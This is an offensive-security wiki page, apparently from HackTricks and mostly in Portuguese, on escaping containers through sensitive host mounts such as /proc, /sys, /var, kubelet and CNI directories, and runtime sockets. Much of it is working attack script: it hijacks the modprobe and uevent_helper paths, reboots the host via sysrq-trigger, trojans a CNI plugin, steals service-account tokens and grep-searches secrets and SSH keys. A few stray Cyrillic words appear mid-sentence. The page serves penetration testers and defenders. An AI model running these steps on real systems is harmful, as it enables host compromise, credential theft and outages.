# Sensitive Host Mounts

{{#include ../../../banners/hacktricks-training.md}}

## Visão geral

Host mounts são uma das superfícies práticas mais importantes para container-escape, porque muitas vezes colapsam uma visão de processo cuidadosamente isolada de volta para a visibilidade direta dos recursos do host. Os casos perigosos não se limitam a `/`. Bind mounts de `/proc`, `/sys`, `/var`, runtime sockets, estado gerenciado pelo kubelet ou paths relacionados a devices podem expor controles do kernel, credentials, filesystems de containers vizinhos e interfaces de gerenciamento do runtime.

Esta página existe separadamente das páginas de proteção individuais porque o modelo de abuso é transversal. Um host mount gravável é perigoso em parte por causa de mount namespaces, em parte por causa de user namespaces, em parte por cobertura de AppArmor ou SELinux, e em parte por qual path exato do host foi exposto. Tratar isso como um tópico próprio torna a superfície de ataque muito mais fácil de entender.

## Exposição de `/proc`

procfs contém tanto informações comuns de processos quanto interfaces de controle do kernel de alto impacto. Um bind mount como `-v /proc:/host/proc` ou uma visão do container que exponha entradas proc graváveis inesperadas pode, portanto, levar a disclosure de informações, denial of service ou execução direta de código no host.

Paths de alto valor em procfs incluem:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abuso

Comece verificando quais entradas de alto valor do procfs estão visíveis ou graváveis:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
Esses paths são interessantes por motivos diferentes. `core_pattern`, `modprobe` e `binfmt_misc` podem se tornar paths de host code-execution quando writable. `kallsyms`, `kmsg`, `kcore` e `config.gz` são fontes poderosas de reconnaissance para kernel exploitation. `sched_debug` e `mountinfo` revelam contexto de processo, cgroup e filesystem que pode ajudar a reconstruir o layout do host de dentro do container.

O valor prático de cada path é diferente, e tratá-los todos como se tivessem o mesmo impacto torna a triagem mais difícil:

- `/proc/sys/kernel/core_pattern`
Se writable, este é um dos paths procfs de maior impacto porque o kernel executará um pipe handler após um crash. Um container que consiga apontar `core_pattern` para um payload armazenado em seu overlay ou em um host path montado pode frequentemente obter host code execution. Veja também [read-only-paths.md](protections/read-only-paths.md) para um exemplo dedicado.
- `/proc/sys/kernel/modprobe`
Este path controla o helper de userspace usado pelo kernel quando ele precisa invocar lógica de carregamento de módulo. Se writable a partir do container e interpretado no contexto do host, pode se tornar outro primitive de host code-execution. É especialmente interessante quando combinado com uma forma de acionar o helper path.
- `/proc/sys/vm/panic_on_oom`
Normalmente não é um primitive de escape limpo, mas pode converter pressão de memória em denial of service em todo o host ao transformar condições de OOM em comportamento de kernel panic.
- `/proc/sys/fs/binfmt_misc`
Se a interface de registration for writable, o atacante pode registrar um handler para um magic value escolhido e obter execução em host-context quando um arquivo correspondente for executado.
- `/proc/config.gz`
Útil para kernel exploit triage. Ajuda a determinar quais subsystems, mitigations e features opcionais do kernel estão habilitados sem precisar de host package metadata.
- `/proc/sysrq-trigger`
Principalmente um path de denial-of-service, mas muito sério. Pode rebootar, causar panic ou de outra forma interromper o host imediatamente.
- `/proc/kmsg`
Revela mensagens do kernel ring buffer. Útil para host fingerprinting, crash analysis e, em alguns ambientes, para leak de informação útil para kernel exploitation.
- `/proc/kallsyms`
Valioso quando readable porque expõe informações de kernel symbols exportados e pode ajudar a derrotar suposições de address randomization durante o desenvolvimento de kernel exploit.
- `/proc/[pid]/mem`
Esta é uma interface direta de memória de processo. Se o processo alvo for alcançável com as condições necessárias no estilo ptrace, pode permitir ler ou modificar a memória de outro processo. O impacto real depende fortemente de credentials, `hidepid`, Yama e restrições de ptrace, então é um path poderoso, mas condicional.
- `/proc/kcore`
Expõe uma visão estilo core-image da memória do sistema. O arquivo é enorme e difícil de usar, mas, se for significativamente readable, indica uma superfície de memória do host mal exposta.
- `/proc/kmem` and `/proc/mem`
Interfaces históricas de memória bruta de alto impacto. Em muitos sistemas modernos, são desabilitadas ou fortemente restritas, mas, se estiverem presentes e utilizáveis, devem ser tratadas como achados críticos.
- `/proc/sched_debug`
Vaza informações de scheduling e task que podem expor identidades de host processes mesmo quando outras visões de processo parecem mais limpas do que o esperado.
- `/proc/[pid]/mountinfo`
Extremamente útil para reconstruir onde o container realmente vive no host, quais paths são overlay-backed e se um mount writable corresponde a conteúdo do host ou apenas à camada do container.

Se `/proc/[pid]/mountinfo` ou detalhes de overlay estiverem readable, use-os para recuperar o host path do container filesystem:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Esses comandos são úteis porque várias técnicas de host-execution exigem transformar um caminho dentro do container no caminho correspondente do ponto de vista do host.

### Exemplo Completo: Abuso do Caminho do Helper `modprobe`

Se `/proc/sys/kernel/modprobe` for gravável a partir do container e o caminho do helper for interpretado no contexto do host, ele pode ser redirecionado para um payload controlado pelo atacante:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
O gatilho exato depende do target e do comportamento do kernel, mas o ponto importante é que um caminho de helper gravável pode redirecionar uma futura invocação de kernel helper para conteúdo de host-path controlado pelo atacante.

### Full Example: Kernel Recon With `kallsyms`, `kmsg`, And `config.gz`

Se o objetivo for assessment de exploitability em vez de escape imediato:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Esses comandos ajudam a responder se informações úteis de símbolos estão visíveis, se mensagens recentes do kernel revelam estado interessante e quais recursos ou mitigações do kernel estão compilados. O impacto geralmente não é escape direto, mas pode reduzir bastante o tempo de triagem de vulnerabilidades do kernel.

### Full Example: SysRq Host Reboot

Se `/proc/sysrq-trigger` for gravável e alcançar a visão do host:
```bash
echo b > /proc/sysrq-trigger
```
O efeito é reinicialização imediata do host. Este não é um exemplo sutil, mas demonstra claramente que a exposição do procfs pode ser muito mais séria do que vazamento de informação.

## `/sys` Exposure

sysfs expõe grandes quantidades de estado do kernel e do device. Alguns paths do sysfs são principalmente úteis para fingerprinting, enquanto outros podem afetar a execução de helper, o comportamento do device, a configuração de security-module ou o estado do firmware.

High-value sysfs paths incluem:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Esses paths importam por motivos diferentes. `/sys/class/thermal` pode influenciar o comportamento de thermal-management e, portanto, a estabilidade do host em ambientes mal expostos. `/sys/kernel/vmcoreinfo` pode vazar crash-dump e informações de kernel-layout que ajudam com low-level host fingerprinting. `/sys/kernel/security` é a interface `securityfs` usada por Linux Security Modules, então acesso inesperado ali pode expor ou alterar estado relacionado a MAC. Paths de variáveis EFI podem afetar configurações de boot suportadas por firmware, tornando-os muito mais sérios do que arquivos de configuração comuns. `debugfs` em `/sys/kernel/debug` é especialmente perigoso porque é intencionalmente uma interface voltada para developers, com expectativas de segurança muito menores do que APIs de kernel hardened voltadas para produção.

Useful review commands for these paths are:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
O que torna esses comandos interessantes:

- `/sys/kernel/security` pode revelar se AppArmor, SELinux, ou outra superfície LSM está visível de uma forma que deveria ter permanecido apenas no host.
- `/sys/kernel/debug` muitas vezes é a descoberta mais alarmante neste grupo. Se `debugfs` estiver montado e puder ser lido ou escrito, espere uma ampla superfície voltada ao kernel, cujo risco exato depende dos nós de debug habilitados.
- A exposição de variáveis EFI é menos comum, mas, se presente, tem alto impacto porque afeta configurações apoiadas pelo firmware, em vez de arquivos normais de runtime.
- `/sys/class/thermal` é principalmente relevante para a estabilidade do host e a interação com hardware, não para uma elegante escape estilo shell.
- `/sys/kernel/vmcoreinfo` é principalmente uma fonte de host-fingerprinting e análise de crash, útil para entender o estado de baixo nível do kernel.

### Full Example: `uevent_helper`

Se `/sys/kernel/uevent_helper` puder ser escrito, o kernel pode executar um helper controlado pelo atacante quando um `uevent` for disparado:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
A razão pela qual isso funciona é que o caminho do helper é interpretado do ponto de vista do host. Uma vez acionado, o helper é executado no contexto do host, e não dentro do container atual.

## `/var` Exposure

Montar o `/var` do host em um container costuma ser subestimado porque não parece tão dramático quanto montar `/`. Na prática, pode ser suficiente para alcançar runtime sockets, diretórios de snapshots de containers, volumes de pods gerenciados pelo kubelet, tokens de service-account projetados e sistemas de arquivos de aplicações vizinhas. Em nós modernos, `/var` costuma ser onde o estado de containers mais interessante do ponto de vista operacional realmente vive.

### Kubernetes Example

Um pod com `hostPath: /var` muitas vezes pode ler tokens projetados de outros pods e conteúdo de snapshots overlay:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Esses comandos são úteis porque respondem se o mount expõe apenas dados de aplicativo sem importância ou credenciais de cluster de alto impacto. Um token de service-account legível pode transformar imediatamente a execução local de código em acesso à Kubernetes API.

Se o token estiver presente, valide o que ele pode alcançar em vez de parar na descoberta do token:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
O impacto aqui pode ser muito maior do que o acesso local ao node. Um token com RBAC amplo pode transformar um `/var` montado em comprometimento em todo o cluster.

### Docker And containerd Example

Em hosts Docker, os dados relevantes geralmente ficam em `/var/lib/docker`, enquanto em nodes Kubernetes baseados em containerd eles podem estar em `/var/lib/containerd` ou em paths específicos do snapshotter:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Se o `/var` montado expõe conteúdos de snapshot graváveis de outra workload, o atacante pode conseguir alterar arquivos da aplicação, plantar conteúdo web ou modificar scripts de inicialização sem tocar na configuração atual do container.

Ideias concretas de abuso quando conteúdo de snapshot gravável for encontrado:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
Esses comandos são úteis porque mostram as três principais famílias de impacto de montagens de `/var`: adulteração de aplicação, recuperação de secrets e movimento lateral para workloads vizinhos.

## Kubelet State, Plugins, And CNI Paths

Uma montagem de `/var/lib/kubelet`, `/opt/cni/bin` ou `/etc/cni/net.d` часто é exposta por meio de privileged DaemonSets, CNI agents, CSI node plugins, GPU operators e storage helpers. Essas montagens são fáceis de descartar como "node plumbing", mas ficam diretamente no caminho de execução para novos pods e muitas vezes contêm credenciais do kubelet, projected secrets, registration sockets e binaries executáveis de plugins no host.

High-value targets incluem:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Useful review commands are:
```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```
Por que estes paths importam:

- `/var/lib/kubelet/pki` pode expor certificados de cliente do kubelet e outras credenciais locais do node que às vezes podem ser reutilizadas contra o API server ou endpoints TLS voltados para o kubelet, dependendo do design do cluster.
- `/var/lib/kubelet/pods` frequentemente contém service-account tokens projetados e Secrets montados para pods vizinhos no mesmo node.
- `/var/lib/kubelet/pod-resources/kubelet.sock` é principalmente uma superfície de reconnaissance, mas muito útil: ela revela quais pods e containers atualmente possuem GPUs, hugepages, dispositivos SR-IOV e outros recursos escassos locais do node.
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins`, e `/var/lib/kubelet/plugins_registry` revelam quais CSI, DRA e device plugins estão instalados e com quais sockets o kubelet é esperado falar. Se esses diretórios forem graváveis em vez de apenas legíveis, o finding se torna muito mais sério.
- `/opt/cni/bin` e `/etc/cni/net.d` ficam diretamente no path de configuração da pod-network. Acesso gravável ali muitas vezes é um primitive de host-execution com atraso, e não apenas exposição de configuração.

### Full Example: Writable `/opt/cni/bin`

Se um diretório de binary CNI do host estiver montado com leitura e escrita, substituir um plugin pode ser suficiente para obter host execution na próxima vez que o kubelet criar um pod sandbox naquele node:
```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > /tmp/cni-triggered
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
```
Isto não é tão imediato quanto um `docker.sock` montado, mas muitas vezes é mais realista em pods de infraestrutura do Kubernetes comprometidos. O ponto importante é que o binário modificado é executado depois pelo fluxo de configuração da rede do host, e não pelo container atual.


## Runtime Sockets

Os mounts sensíveis do host часто incluem runtime sockets em vez de diretórios completos. Eles são tão importantes que merecem repetição explícita aqui:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Veja [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) para fluxos completos de exploração assim que um desses sockets for montado.

Como um padrão rápido de primeira interação:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
Se um destes funcionar, o caminho de "mounted socket" para "start a more privileged sibling container" geralmente é muito mais curto do que qualquer caminho de kernel breakout.

## Mount-Related CVEs

Host mounts também se cruzam com runtime vulnerabilities. Exemplos recentes importantes incluem:

- `CVE-2024-21626` em `runc`, onde um leaked directory file descriptor poderia colocar o working directory no filesystem do host.
- `CVE-2024-23651`, `CVE-2024-23652` e `CVE-2024-23653` em BuildKit, onde Dockerfiles maliciosos, frontends e fluxos `RUN --mount` poderiam reintroduzir host file access, deletion ou elevated privileges durante builds.
- `CVE-2024-1753` em Buildah e Podman build flows, onde crafted bind mounts durante build poderiam expor `/` read-write.
- `CVE-2025-47290` em `containerd` 2.1.0, onde um TOCTOU durante image unpack poderia permitir que uma imagem specially crafted modificasse o filesystem do host durante pull.

Essas CVEs importam aqui porque mostram que o tratamento de mount não é apenas uma questão de configuração do operador. O runtime em si também pode introduzir condições de escape driven by mount.

## Checks

Use estes comandos para localizar rapidamente as exposições de mount de maior valor:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
O que é interessante aqui:

- Host root, `/proc`, `/sys`, `/var` e runtime sockets são todos achados de alta prioridade.
- Entradas de proc/sys graváveis muitas vezes significam que o mount está expondo controles de kernel globais do host, em vez de uma visão segura do container.
- Caminhos montados de `/var` merecem revisão de credenciais e de workloads vizinhos, não apenas revisão do filesystem.
- Diretórios de estado do Kubelet e caminhos de CNI/plugin merecem a mesma prioridade que runtime sockets porque muitas vezes ficam diretamente no caminho de criação de pods e distribuição de credenciais do node.

## References

- [Local Files And Paths Used By The Kubelet](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [cilium-agent container can access the host via `hostPath` mount](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
